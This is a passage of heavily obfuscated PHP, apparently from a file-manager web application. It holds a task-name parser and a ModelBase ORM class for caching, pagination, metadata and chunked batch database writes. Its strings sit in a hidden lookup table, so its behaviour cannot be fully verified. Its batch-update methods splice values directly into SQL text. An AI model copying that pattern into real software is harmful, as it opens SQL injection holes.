$Cåé©ÂÀ‚³[$C“öˆˆó¶˜[1468]] = 0; $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[1469]] = 0; goto d¥‰İšõ²œ; cçÙ·ÖÙå¥: $this->update(); self::log($C“öˆˆó¶˜[1498] . json_encode(array($Cåé©ÂÀ‚³, $b±Ó¼Šé‰’))); goto aªÒ¥›è¡Ç; aªÒ¥›è¡Ç: } public function nameParse($a¬¥¾ÕİÎà) { goto F¬ÖÜ»íñÄ; F¬ÖÜ»íñÄ: $aæ÷È¶¯ŸŠ =& $_SERVER[í™]; $BÇ§šåòŞÛ =& $this->task; if ($BÇ§šåòŞÛ[$aæ÷È¶¯ŸŠ[1496]] == $aæ÷È¶¯ŸŠ[1026]) { $BÇ§šåòŞÛ[$aæ÷È¶¯ŸŠ[1496]] = $aæ÷È¶¯ŸŠ[301]; $BÇ§šåòŞÛ[$aæ÷È¶¯ŸŠ[1473]] = 0; $BÇ§šåòŞÛ[$aæ÷È¶¯ŸŠ[680]] = 0; } goto Bî„ëíºÁ‘; eù×Œôé…: $this->update(); goto E÷³ ÜĞ›«; Bî„ëíºÁ‘: $D¯Ã”ÀùêÃ = get_path_this($a¬¥¾ÕİÎà); if (strstr($D¯Ã”ÀùêÃ, $aæ÷È¶¯ŸŠ[91])) { $BÇ§šåòŞÛ[$aæ÷È¶¯ŸŠ[976]] += 1; $BÇ§šåòŞÛ[$aæ÷È¶¯ŸŠ[962]] += 1; } $BÇ§šåòŞÛ[$aæ÷È¶¯ŸŠ[1466]] = $a¬¥¾ÕİÎà; goto eù×Œôé…; E÷³ ÜĞ›«: } } goto DïƒŠÚ¨¦; Eï”Ä¢ä­Š: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\124\x69\x6d\145", "\x74\151\x6d\x65", "\x69\156\163\x65\x72\164\54\x75\160\x64\x61\164\x65", "\x66\165\x6e\x63\164\x69\x6f\156"), array("\143\x72\145\x61\x74\x65\124\x69\155\x65", "\x74\x69\155\145", "\x69\x6e\163\145\x72\164", "\146\x75\156\143\164\151\x6f\x6e")); public function setDataAuto($aÊÂˆïĞå) { $this->dataAuto = $aÊÂˆïĞå; } public function __construct($EƒïÏôÛ“ = '', $Dèö³×× = '', $cÁ„„Ó†øÄ = '') { parent::__construct($EƒïÏôÛ“, $Dèö³××, $cÁ„„Ó†øÄ); } public static function textEncode($AÒ–­øæâÔ) { if (!$AÒ–­øæâÔ) { return $AÒ–­øæâÔ; } $aïÊ¸¤õ‰ï = json_encode($AÒ–­øæâÔ); $aïÊ¸¤õ‰ï = preg_replace_callback($_SERVER[í™][342], function ($bâ®éãªî”) { return addslashes($bâ®éãªî”[0]); }, $aïÊ¸¤õ‰ï); return json_decode($aïÊ¸¤õ‰ï); } public static function textDecode($Aáíéöªæ) { $E­ˆ†³Òâ÷ =& $_SERVER[í™]; $EëøÕ‰¯¶› = json_encode($Aáíéöªæ); $EëøÕ‰¯¶› = preg_replace_callback($E­ˆ†³Òâ÷[343], function ($AÌÇÎÒÂá‡) { return $_SERVER[í™][93]; }, $EëøÕ‰¯¶›); return json_decode($EëøÕ‰¯¶›); } protected $tableMeta = array(); protected function _beforeInsert(&$e¾ÈìÆ¿çÙ, $fÀ·÷²×) { $cÎËË†•Ê =& $_SERVER[í™]; if (!$this->checkDataAutoHas($cÎËË†•Ê[344])) { return; } $this->dataBeforeFilter($e¾ÈìÆ¿çÙ, $cÎËË†•Ê[344]); } protected function _beforeUpdate(&$D ¨¬ÒÊá¦, $f—Ñ¼ÇÜ‡­) { $Cƒ½”¡Û§ã =& $_SERVER[í™]; if (!$this->checkDataAutoHas($Cƒ½”¡Û§ã[345])) { return; } $this->dataBeforeFilter($D ¨¬ÒÊá¦, $Cƒ½”¡Û§ã[345]); } protected function _afterSelect(&$DÉŠÓˆÓš•, $e’’Âª¾Ñ¸) { if (!is_array($DÉŠÓˆÓš•)) { return; } if (!$this->checkDataAutoHas($_SERVER[í™][346])) { return; } foreach ($DÉŠÓˆÓš• as &$d³¸Ôğ”µ) { $this->dataAfterFilter($d³¸Ôğ”µ); } } protected function _afterFind(&$BÄœöÙ”‹¼, $C¹Ë¼Ç£) { if (!is_array($BÄœöÙ”‹¼)) { return; } if (!$this->checkDataAutoHas($_SERVER[í™][346])) { return; } $this->dataAfterFilter($BÄœöÙ”‹¼); } public function setAutoIncrement($EÏ±¿®¼Ø) { $CÅ¤µˆ‡µ = array($this->getPk() => $EÏ±¿®¼Ø); $dù«¾š­½ = $this->data($CÅ¤µˆ‡µ)->add(); if ($dù«¾š­½) { $this->delete($dù«¾š­½); } } public function getAutoIncrement() { $c™¶‡Š§ = $this->getTableName(); $A“†³¬”³ = $this->max($this->getPk()); $cŠ¤¿ÉÛ = $this->query("\163\150\157\167\40\x74\x61\142\x6c\x65\40\x73\164\141\164\x75\x73\40\167\150\x65\x72\145\40\x4e\141\x6d\145\75\x27{$c™¶‡Š§}\47"); $Fáç›Õ×÷´ = $cŠ¤¿ÉÛ[0][$_SERVER[í™][347]]; $aªÃÓ­ä—– = max($A“†³¬”³, $Fáç›Õ×÷´); return $aªÃÓ­ä—–; } protected function _callBefore($CÎ‘ÅË©™«, $b¹´„ù¡Ò) { return $this->cacheCallCheck($CÎ‘ÅË©™«, $b¹´„ù¡Ò, !1); } protected function _callAfter($e¨®Úè–éî, $eä×Ë‡ë—ø) { return $this->cacheCallCheck($e¨®Úè–éî, $eä×Ë‡ë—ø, !0); } protected function cacheFunctionAlias($Dòà¸¶‡) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($F—¼‹·–…, $Fìî‚õâ”È, $e³ƒ¥¥Ç¤Í = false) { $fç¢é»¨Öˆ = $this->cacheFunctionAlias($Fìî‚õâ”È); if (!$fç¢é»¨Öˆ) { return; } foreach ($fç¢é»¨Öˆ as $f˜—˜Á·É => $AìÈ¹å­ËÎ) { $bÚß‚¹§‹¹ = $AìÈ¹å­ËÎ[0]; $E‹É¡‹ò‹ = explode($_SERVER[í™][47], $AìÈ¹å­ËÎ[1]); if ($F—¼‹·–… == $f˜—˜Á·É) { return $this->cacheFunctionGet($f˜—˜Á·É, $bÚß‚¹§‹¹); } if ($e³ƒ¥¥Ç¤Í && in_array($F—¼‹·–…, $E‹É¡‹ò‹)) { $this->cacheFunctionClear($f˜—˜Á·É, $bÚß‚¹§‹¹); } } } public function cacheFunctionGet($a»Û‘ÁÜÄ, $Dßôé¬Š§Í) { $D…ñŸç®„Œ = $this->cacheKeyMake($a»Û‘ÁÜÄ, $Dßôé¬Š§Í); $D¤ ¬³ç›Ú = Cache::get($D…ñŸç®„Œ); if (!is_array($D¤ ¬³ç›Ú)) { $D¤ ¬³ç›Ú = call_user_func_array(array($this, $a»Û‘ÁÜÄ), array($Dßôé¬Š§Í, !0)); Cache::set($D…ñŸç®„Œ, $D¤ ¬³ç›Ú); } return $D¤ ¬³ç›Ú; } public function cacheFunctionClear($f½ø÷¨ÉïÇ, $A®®Ãô–Š) { $c×¼Âù‘¡ƒ = $A®®Ãô–Š; if (!is_array($A®®Ãô–Š)) { $c×¼Âù‘¡ƒ = array($A®®Ãô–Š); } foreach ($c×¼Âù‘¡ƒ as $E¢î„À¥) { $F†Ğ‚ç¦«¢ = $this->cacheKeyMake($f½ø÷¨ÉïÇ, $E¢î„À¥); Cache::remove($F†Ğ‚ç¦«¢); } } private function cacheKeyMake($C•ÉÔïƒŠ, $A×†©ã®–¼) { $e’Æ†«Ó³ =& $_SERVER[í™]; return get_class($this) . $e’Æ†«Ó³[70] . $C•ÉÔïƒŠ . $e’Æ†«Ó³[348] . $A×†©ã®–¼; } protected function selectPage($e„ƒŠµ¼… = 200, $F°¡¶¿Şè½ = 1) { goto BßØØ§È’©; føâ™ÈÜœ: $Bƒ’±…ç­ = 4000; $e„ƒŠµ¼… = isset($in[$dŠ‡°øêŒ¶[349]]) ? $in[$dŠ‡°øêŒ¶[349]] : $e„ƒŠµ¼…; if ($e„ƒŠµ¼… === -1) { unset($in[$dŠ‡°øêŒ¶[349]]); $Bƒ’±…ç­ = 100000000; $e„ƒŠµ¼… = $Bƒ’±…ç­; } goto c•¨°«“Ù; d‡­ºŸ¸Æ: $this->optionsValue($eå„Ù›¯Ş); $A³íàí®ƒ = $this->page($F°¡¶¿Şè½, $e„ƒŠµ¼…)->select(); $A³íàí®ƒ = is_array($A³íàí®ƒ) ? $A³íàí®ƒ : array(); goto eØ’ôğŸÔª; eØ’ôğŸÔª: if ($d´ ÆÁ¸Š± == 1) { $bÈäõ‘ÜÀÏ = count($A³íàí®ƒ); } $DÒÑ·êëÑ = array($dŠ‡°øêŒ¶[351] => array($dŠ‡°øêŒ¶[352] => $bÈäõ‘ÜÀÏ, $dŠ‡°øêŒ¶[349] => $e„ƒŠµ¼…, $dŠ‡°øêŒ¶[340] => $F°¡¶¿Şè½, $dŠ‡°øêŒ¶[353] => $d´ ÆÁ¸Š±), $dŠ‡°øêŒ¶[354] => $A³íàí®ƒ ? $A³íàí®ƒ : array()); return $DÒÑ·êëÑ; goto F á«¡š; DµÊöÎ…Ï: $bÈäõ‘ÜÀÏ = intval($this->count()); $e„ƒŠµ¼… = intval($e„ƒŠµ¼…); $e„ƒŠµ¼… = $e„ƒŠµ¼… <= 5 ? 5 : ($e„ƒŠµ¼… >= $Bƒ’±…ç­ ? $Bƒ’±…ç­ : $e„ƒŠµ¼…); goto a’Î¿¢Áòó; a’Î¿¢Áòó: $d´ ÆÁ¸Š± = ceil($bÈäõ‘ÜÀÏ / $e„ƒŠµ¼…); $F°¡¶¿Şè½ = intval(isset($in[$dŠ‡°øêŒ¶[340]]) ? $in[$dŠ‡°øêŒ¶[340]] : $F°¡¶¿Şè½); $F°¡¶¿Şè½ = $F°¡¶¿Şè½ <= 1 ? 1 : ($F°¡¶¿Şè½ >= $d´ ÆÁ¸Š± ? $d´ ÆÁ¸Š± : $F°¡¶¿Şè½); goto d‡­ºŸ¸Æ; BßØØ§È’©: $dŠ‡°øêŒ¶ =& $_SERVER[í™]; global $in; $eå„Ù›¯Ş = $this->optionsValue(); goto føâ™ÈÜœ; c•¨°«“Ù: $EßëÉ…¸ = $eå„Ù›¯Ş; $EßëÉ…¸[$dŠ‡°øêŒ¶[350]] = array(); $this->optionsValue($EßëÉ…¸); goto DµÊöÎ…Ï; F á«¡š: } protected function checkLength($Aºêˆ‰Ó–, $AÜ¢¯ï¯¡ù = 0, $c÷ÍÄ‡„ò‚ = '') { $DÉÁï×Êáœ =& $_SERVER[í™]; $AÜ¢¯ï¯¡ù = $AÜ¢¯ï¯¡ù ? $AÜ¢¯ï¯¡ù : 65536; if (!$Aºêˆ‰Ó– || strlen($Aºêˆ‰Ó–) < $AÜ¢¯ï¯¡ù) { return; } $c÷ÍÄ‡„ò‚ = $c÷ÍÄ‡„ò‚ ? $c÷ÍÄ‡„ò‚ . $DÉÁï×Êáœ[67] : $DÉÁï×Êáœ[33]; show_json($c÷ÍÄ‡„ò‚ . LNG($DÉÁï×Êáœ[355]) . "\x28{$AÜ¢¯ï¯¡ù}\51", !1); } protected function metaSet($eÃ¤Î¨»ÚŒ, $eê‡ˆäÚÖ = null, $EğÎÖõ…ÁØ = null) { goto E‹µÛâÄ†ñ; a¢‹ö»ˆà: $F‚ãÌ…‡ôÆ = $this->tableMeta[$Eå¡¸ò£Çé[357]]; $A˜ÎÕ‡Ñ¬ = Model($F‚ãÌ…‡ôÆ); $bÈ‘óÍŠ˜¯ = array($D×Â»Ûº¼„ => $eÃ¤Î¨»ÚŒ, $Eå¡¸ò£Çé[358] => $eê‡ˆäÚÖ); goto fåºÂÄÌá; Eïç¬¶†»Ğ: if (is_string($eê‡ˆäÚÖ)) { $CÈ·‡¦’³Û[$eê‡ˆäÚÖ] = $EğÎÖõ…ÁØ; } $BÈÀŒ–¨öÖ = array(); foreach ($CÈ·‡¦’³Û as $E—ô‘Í«Şô => $fâ´­©ñìã) { $this->checkLength($fâ´­©ñìã, !1, $F‚ãÌ…‡ôÆ . $Eå¡¸ò£Çé[4] . $E—ô‘Í«Şô); $BÈÀŒ–¨öÖ[] = array($D×Â»Ûº¼„ => $eÃ¤Î¨»ÚŒ, $Eå¡¸ò£Çé[89] => $E—ô‘Í«Şô, $Eå¡¸ò£Çé[359] => $fâ´­©ñìã); } goto E¬é‰„é; fåºÂÄÌá: if (is_null($eê‡ˆäÚÖ)) { return $A˜ÎÕ‡Ñ¬->where(array($D×Â»Ûº¼„ => $eÃ¤Î¨»ÚŒ))->delete(); } if (is_null($EğÎÖõ…ÁØ) && is_string($eê‡ˆäÚÖ)) { return $A˜ÎÕ‡Ñ¬->where($bÈ‘óÍŠ˜¯)->delete(); } $CÈ·‡¦’³Û = is_array($eê‡ˆäÚÖ) ? $eê‡ˆäÚÖ : array(); goto Eïç¬¶†»Ğ; E‹µÛâÄ†ñ: $Eå¡¸ò£Çé =& $_SERVER[í™]; if (!$this->tableMeta) { return !1; } $D×Â»Ûº¼„ = $this->tableMeta[$Eå¡¸ò£Çé[356]]; goto a¢‹ö»ˆà; E¬é‰„é: $A˜ÎÕ‡Ñ¬->where(array($D×Â»Ûº¼„ => $eÃ¤Î¨»ÚŒ))->addAll($BÈÀŒ–¨öÖ, array(), !0); return !0; goto DÒèÎ…¥¯æ; DÒèÎ…¥¯æ: } public function metaGet($B™¡®§÷“, $f—´öˆê§„ = false) { goto FáïÌÆ›¢Æ; f­—È¶²ê: $dÔËëÖÜÕ¨ = Model($this->tableMeta[$e¨Œî¾ßÁ‡[357]]); if ($f—´öˆê§„) { $DƒÔ¹Ö®§› = array($FÛ‡ÛâËğ§ => $B™¡®§÷“, $e¨Œî¾ßÁ‡[89] => $f—´öˆê§„); return $dÔËëÖÜÕ¨->where($DƒÔ¹Ö®§›)->getField($e¨Œî¾ßÁ‡[359]); } $DƒÔ¹Ö®§› = array($FÛ‡ÛâËğ§ => $B™¡®§÷“); goto D­ÄïòÖ¨†; FáïÌÆ›¢Æ: $e¨Œî¾ßÁ‡ =& $_SERVER[í™]; if (!$this->tableMeta) { return array(); } $FÛ‡ÛâËğ§ = $this->tableMeta[$e¨Œî¾ßÁ‡[356]]; goto f­—È¶²ê; D­ÄïòÖ¨†: $C“¯ÎŸÈ¸¸ = $dÔËëÖÜÕ¨->field($e¨Œî¾ßÁ‡[360])->where($DƒÔ¹Ö®§›)->select(); $C“¯ÎŸÈ¸¸ = array_to_keyvalue($C“¯ÎŸÈ¸¸, $e¨Œî¾ßÁ‡[89], $e¨Œî¾ßÁ‡[359]); return $C“¯ÎŸÈ¸¸; goto Fõ¹Ø¯‡³›; Fõ¹Ø¯‡³›: } private function checkDataAutoHas($d†ñ“åš›•) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Fê‹£ëà‘) { if (in_array($d†ñ“åš›•, explode($_SERVER[í™][47], $Fê‹£ëà‘[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$aøÀ×æŠÍ, $EŠÉ¬å¶Ùš) { $dÀÉ½ÎÙ–ğ =& $_SERVER[í™]; foreach ($this->dataAuto as $eàœ÷àßÅå) { $f±İ©ê´ … = $eàœ÷àßÅå[0]; if (!in_array($EŠÉ¬å¶Ùš, explode($dÀÉ½ÎÙ–ğ[47], $eàœ÷àßÅå[2]))) { continue; } switch (trim($eàœ÷àßÅå[3])) { case $dÀÉ½ÎÙ–ğ[309]: case $dÀÉ½ÎÙ–ğ[310]: $eË•É¿µÊâ = $eàœ÷àßÅå[1]; $dî×›Ù¤Ô± = isset($eàœ÷àßÅå[4]) ? (array) $eàœ÷àßÅå[4] : array(); if ($eË•É¿µÊâ == $dÀÉ½ÎÙ–ğ[190] && array_key_exists($f±İ©ê´ …, $aøÀ×æŠÍ)) { if (!$aøÀ×æŠÍ[$f±İ©ê´ …]) { unset($aøÀ×æŠÍ[$f±İ©ê´ …]); } break; } if (isset($aøÀ×æŠÍ[$f±İ©ê´ …])) { array_unshift($dî×›Ù¤Ô±, $aøÀ×æŠÍ[$f±İ©ê´ …]); } if ($dÀÉ½ÎÙ–ğ[309] == $eàœ÷àßÅå[3]) { $aøÀ×æŠÍ[$f±İ©ê´ …] = call_user_func_array($eË•É¿µÊâ, $dî×›Ù¤Ô±); } else { $aøÀ×æŠÍ[$f±İ©ê´ …] = call_user_func_array(array(&$this, $eË•É¿µÊâ), $dî×›Ù¤Ô±); } break; case $dÀÉ½ÎÙ–ğ[261]: $aøÀ×æŠÍ[$f±İ©ê´ …] = $aøÀ×æŠÍ[$eàœ÷àßÅå[1]]; break; case $dÀÉ½ÎÙ–ğ[282]: if (isset($aøÀ×æŠÍ[$f±İ©ê´ …]) && !is_string($aøÀ×æŠÍ[$f±İ©ê´ …])) { $aøÀ×æŠÍ[$f±İ©ê´ …] = json_encode_force($aøÀ×æŠÍ[$f±İ©ê´ …]); } break; case $dÀÉ½ÎÙ–ğ[311]: if ($aøÀ×æŠÍ[$f±İ©ê´ …] === $dÀÉ½ÎÙ–ğ[33]) { unset($aøÀ×æŠÍ[$f±İ©ê´ …]); } break; case $dÀÉ½ÎÙ–ğ[312]: $aøÀ×æŠÍ[$f±İ©ê´ …] = $eàœ÷àßÅå[1]; default: break; } } if ($EŠÉ¬å¶Ùš == $dÀÉ½ÎÙ–ğ[344]) { $BÃá¬Âáô = strtolower($this->db->getDbType()); if (strpos($BÃá¬Âáô, $dÀÉ½ÎÙ–ğ[9]) !== 0) { return; } $D‡ìğĞÊÙ = $this->field(!0)->fields; $FÀ×¼¢¬îÏ = $D‡ìğĞÊÙ[$dÀÉ½ÎÙ–ğ[240]]; if (isset($D‡ìğĞÊÙ[$dÀÉ½ÎÙ–ğ[239]])) { unset($FÀ×¼¢¬îÏ[$D‡ìğĞÊÙ[$dÀÉ½ÎÙ–ğ[239]]]); } foreach ($FÀ×¼¢¬îÏ as $cŸ‡«ñÓßÔ => $EŠÉ¬å¶Ùš) { if (!isset($aøÀ×æŠÍ[$cŸ‡«ñÓßÔ])) { $aøÀ×æŠÍ[$cŸ‡«ñÓßÔ] = $dÀÉ½ÎÙ–ğ[33]; } } } } private function dataAfterFilter(&$C¨âîçÊ³Ç) { $BÍ¿Ğø±ğ =& $_SERVER[í™]; foreach ($this->dataAuto as $fãóÇÖâ ) { $AÚ¯ÚÛÇ’° = $fãóÇÖâ [0]; if (!in_array($BÍ¿Ğø±ğ[346], explode($BÍ¿Ğø±ğ[47], $fãóÇÖâ [2]))) { continue; } if (!isset($C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°])) { continue; } switch (trim($fãóÇÖâ [3])) { case $BÍ¿Ğø±ğ[309]: case $BÍ¿Ğø±ğ[310]: $cÜÉÀñø‡´ = isset($fãóÇÖâ [4]) ? (array) $fãóÇÖâ [4] : array(); array_unshift($cÜÉÀñø‡´, $C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°]); if ($BÍ¿Ğø±ğ[309] == $fãóÇÖâ [3]) { $C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°] = call_user_func_array($fãóÇÖâ [1], $cÜÉÀñø‡´); } else { $C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°] = call_user_func_array(array(&$this, $fãóÇÖâ [1]), $cÜÉÀñø‡´); } break; case $BÍ¿Ğø±ğ[261]: $C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°] = $C¨âîçÊ³Ç[$fãóÇÖâ [1]]; break; case $BÍ¿Ğø±ğ[282]: $aÎÕ«…šá” = $C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°]; $C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°] = json_decode($aÎÕ«…šá”, !0); if (is_null($C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°])) { $C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°] = $aÎÕ«…šá”; } break; case $BÍ¿Ğø±ğ[311]: if ($C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°] === $BÍ¿Ğø±ğ[33]) { unset($C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°]); } break; case $BÍ¿Ğø±ğ[312]: $C¨âîçÊ³Ç[$AÚ¯ÚÛÇ’°] = $fãóÇÖâ [1]; default: break; } } } public function saveAll($A¨¦œçãÂ ) { goto fá•ïÉåù; c•ë–˜†¹Á: $A¨¦œçãÂ  = is_array($A¨¦œçãÂ ) ? $A¨¦œçãÂ  : array(); $fšŒºÁÓ„‘ = $fÌõâÏ­Ä²[361]; $EÜœÇ÷œ˜æ = 0; goto c™¾Ÿ½¬; d±í¥ªí©å: $this->chunkEventSet(); goto Cğùœ÷ÆÖ°; c™¾Ÿ½¬: $a³‰«›ŒæØ = array(); $CÁµ£“¬× = count($A¨¦œçãÂ ); for ($cí÷¦šÄ° = 0; $cí÷¦šÄ° < $CÁµ£“¬×; $cí÷¦šÄ°++) { $EŠ‹„éòÓ‡ = $A¨¦œçãÂ [$cí÷¦šÄ°]; if (!is_array($EŠ‹„éòÓ‡) || count($EŠ‹„éòÓ‡) != 4) { continue; } $e¬‚½¥˜±´ = "\125\x50\104\x41\x54\105\x20\140{$a¨ì—ÔçÃí}\140\40\123\105\x54\40{$EŠ‹„éòÓ‡[2]}\x20\75\x20\103\101\123\105\40{$EŠ‹„éòÓ‡[0]}\x20\12"; if ($EÜœÇ÷œ˜æ == 0) { $fšŒºÁÓ„‘ = $e¬‚½¥˜±´; } $a³‰«›ŒæØ[] = $fÌõâÏ­Ä²[113] . $EŠ‹„éòÓ‡[1] . $fÌõâÏ­Ä²[113]; $EÜœÇ÷œ˜æ++; $fšŒºÁÓ„‘ .= "\40\127\x48\105\x4e\x20\47{$EŠ‹„éòÓ‡[1]}\x27\40\124\x48\105\x4e\40\47{$EŠ‹„éòÓ‡[3]}\47\x20\xa"; if ($EÜœÇ÷œ˜æ == $A›™éåºÇ || $cí÷¦šÄ° == $CÁµ£“¬× - 1) { goto f‹÷Áåä…; f‹÷Áåä…: $A«Ó¸£øŒ = implode($fÌõâÏ­Ä²[47], $a³‰«›ŒæØ); $fšŒºÁÓ„‘ .= "\40\105\116\x44\40\40\127\110\105\x52\x45\x20{$EŠ‹„éòÓ‡[0]}\x20\x49\x4e\40\x28{$A«Ó¸£øŒ}\51\x20"; $this->execute($fšŒºÁÓ„‘); goto Cº¥•ß½ƒã; Cº¥•ß½ƒã: $EÜœÇ÷œ˜æ = 0; $fšŒºÁÓ„‘ = $e¬‚½¥˜±´; $this->chunkEventCheck(count($a³‰«›ŒæØ)); goto F‚†ªø¾” ; F‚†ªø¾” : $a³‰«›ŒæØ = array(); goto aæ¾ù«›õ¯; aæ¾ù«›õ¯: } } goto d±í¥ªí©å; fá•ïÉåù: $fÌõâÏ­Ä² =& $_SERVER[í™]; $a¨ì—ÔçÃí = $this->tablePrefix . $this->tableName; $A›™éåºÇ = self::SQL_WHERE_IN_CHUNK; goto c•ë–˜†¹Á; Cğùœ÷ÆÖ°: } public function saveAllEach($c§ÊŞ…¥…ö) { $b¸ÖŸŒŠâ =& $_SERVER[í™]; $F™íˆğ«ª = $this->tablePrefix . $this->tableName; foreach ($c§ÊŞ…¥…ö as $féƒàØçŞ) { if (!is_array($féƒàØçŞ) || count($féƒàØçŞ) != 4) { continue; } $b…ÛÔŠôÂ´ = $féƒàØçŞ[0] . $b¸ÖŸŒŠâ[362] . $féƒàØçŞ[1] . $b¸ÖŸŒŠâ[113]; $D”ˆ…†ğˆ = $féƒàØçŞ[2] . $b¸ÖŸŒŠâ[362] . $féƒàØçŞ[3] . $b¸ÖŸŒŠâ[113]; $D‘Ğ–¢÷ä = "\x75\160\144\141\x74\x65\x20{$F™íˆğ«ª}\x20\x73\x65\x74\40{$D”ˆ…†ğˆ}\40\x77\150\145\162\x65\x20{$b…ÛÔŠôÂ´}\x3b"; $this->execute($D‘Ğ–¢÷ä); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Cæ›µ÷Ü = false, $eˆñæš·‘ã = false) { $this->_chunkEvent = $Cæ›µ÷Ü; $this->_chunkEventParam = $eˆñæš·‘ã; } private function chunkEventCheck($a±ÖÌ¥§¼Ä) { if (!$this->_chunkEvent) { return; } $C„…¤‘ÎïÜ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $C„…¤‘ÎïÜ[$_SERVER[í™][363]] = $a±ÖÌ¥§¼Ä; Hook::trigger($this->_chunkEvent, $C„…¤‘ÎïÜ); } public function addAll($E¤–í©÷Œ, $EŸâ•Óá½ğ = array(), $aŸÑ‚ÏãŸ¢ = false) { goto EÑà‘Â½‹Š; EÑà‘Â½‹Š: $E‘Ñ‘«ªøÓ =& $_SERVER[í™]; ignore_timeout(); $C‰æªÛà¤ = self::SQL_WHERE_IN_CHUNK; goto bà¶…¢Š£; dÊ§›¢ß³¸: if (method_exists($this->db, $E‘Ñ‘«ªøÓ[260])) { for ($AÜõÕŒµõ¤ = 0; $AÜõÕŒµõ¤ < count($E¤–í©÷Œ); $AÜõÕŒµõ¤ += $C‰æªÛà¤) { $C‡Ÿö½‰Ô÷ = array_slice($E¤–í©÷Œ, $AÜõÕŒµõ¤, $C‰æªÛà¤); if (!is_array($C‡Ÿö½‰Ô÷) || count($C‡Ÿö½‰Ô÷) == 0) { break; } $E›Î‡è± = $this->db->insertAll($C‡Ÿö½‰Ô÷, $EŸâ•Óá½ğ, $aŸÑ‚ÏãŸ¢); $this->chunkEventCheck(count($C‡Ÿö½‰Ô÷)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($E¤–í©÷Œ as $D—ò¬†¹“Š => $a¸–õÙƒ¤) { $E›Î‡è± = $this->db->insert($a¸–õÙƒ¤, $EŸâ•Óá½ğ, $aŸÑ‚ÏãŸ¢); } $this->commit(); } if (!1 !== $E›Î‡è±) { $dºÏ­ëå„ = $this->getLastInsID(); if ($dºÏ­ëå„) { return $dºÏ­ëå„; } } return $E›Î‡è±; goto bñËÑã‰†; bà¶…¢Š£: if (empty($E¤–í©÷Œ)) { $this->error = think_lang($E‘Ñ‘«ªøÓ[259]); return !1; } $EŸâ•Óá½ğ = $this->_parseOptions($EŸâ•Óá½ğ); foreach ($E¤–í©÷Œ as $D—ò¬†¹“Š => $a¸–õÙƒ¤) { $E¤–í©÷Œ[$D—ò¬†¹“Š] = $this->_facade($a¸–õÙƒ¤); $this->_beforeInsert($E¤–í©÷Œ[$D—ò¬†¹“Š], $EŸâ•Óá½ğ); } goto dÊ§›¢ß³¸; bñËÑã‰†: } public function save($DØ´ù„¶à = '', $cóÊŒŠÄÖ¹ = array()) { goto cÎÏÃ„Œä; AŸ¶ÆĞØ¢á: $E—Öì°¬‘¢ = $this->findWhereField($E±†ÆÆÙÕ); if (!$E—Öì°¬‘¢) { return parent::save($DØ´ù„¶à, $cóÊŒŠÄÖ¹); } $DØ¼“³ï×¤ = 0; goto f†õÌŸ¶«; fÃó­’ŒÀ«: for ($aõ™ …ñäÄ = 0; $aõ™ …ñäÄ < $Cø‘ˆØ‰é; $aõ™ …ñäÄ += $F¥Ğ¿ñ•Ÿ²) { $dîÖêÖ‹øĞ = array_slice($B‘”õÌ‹Ò, $aõ™ …ñäÄ, $F¥Ğ¿ñ•Ÿ²); if (!is_array($dîÖêÖ‹øĞ) || count($dîÖêÖ‹øĞ) == 0) { break; } $E±†ÆÆÙÕ[$b¢ØÖÑ…±Œ[263]][$E—Öì°¬‘¢][1] = $dîÖêÖ‹øĞ; $this->optionsValue($E±†ÆÆÙÕ); $DØ¼“³ï×¤ += parent::save($DØ´ù„¶à, $cóÊŒŠÄÖ¹); $this->chunkEventCheck(count($dîÖêÖ‹øĞ)); } $this->chunkEventSet(); return $DØ¼“³ï×¤; goto e„§õÏ¦²; f†õÌŸ¶«: $B‘”õÌ‹Ò = $E±†ÆÆÙÕ[$b¢ØÖÑ…±Œ[263]][$E—Öì°¬‘¢][1]; $B‘”õÌ‹Ò = is_array($B‘”õÌ‹Ò) ? $B‘”õÌ‹Ò : array(); $Cø‘ˆØ‰é = count($B‘”õÌ‹Ò); goto fÃó­’ŒÀ«; cÎÏÃ„Œä: $b¢ØÖÑ…±Œ =& $_SERVER[í™]; $F¥Ğ¿ñ•Ÿ² = self::SQL_WHERE_IN_CHUNK; $E±†ÆÆÙÕ = $this->optionsValue(); goto AŸ¶ÆĞØ¢á; e„§õÏ¦²: } public function add($e»í†”Û  = '', $B²Éôœ¢ßõ = array(), $aÂ¢×Ò™•ó = false) { if ($this->addTaskStatus && is_array($e»í†”Û )) { $this->addTaskData[] = $e»í†”Û ; return; } return parent::add($e»í†”Û , $B²Éôœ¢ßõ, $aÂ¢×Ò™•ó); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($CÁŸ´íóğÛ = array()) { goto FÔ´Ö†µš§; BÆ‹ˆ‡µËä: $F™îİ× = is_array($F™îİ×) ? $F™îİ× : array(); $d®æ˜‡œØ› = null; for ($D´ˆÂÀôĞ = 0; $D´ˆÂÀôĞ < count($F™îİ×); $D´ˆÂÀôĞ += $CïøÙÇ“¤¯) { $fĞÓ«–¬§Ä = array_slice($F™îİ×, $D´ˆÂÀôĞ, $CïøÙÇ“¤¯); if (!is_array($fĞÓ«–¬§Ä) || count($fĞÓ«–¬§Ä) == 0) { break; } $c¼®‡ôãéê[$C©Ú­ö×—£[263]][$AªÒå‘Ä·Ë][1] = $fĞÓ«–¬§Ä; 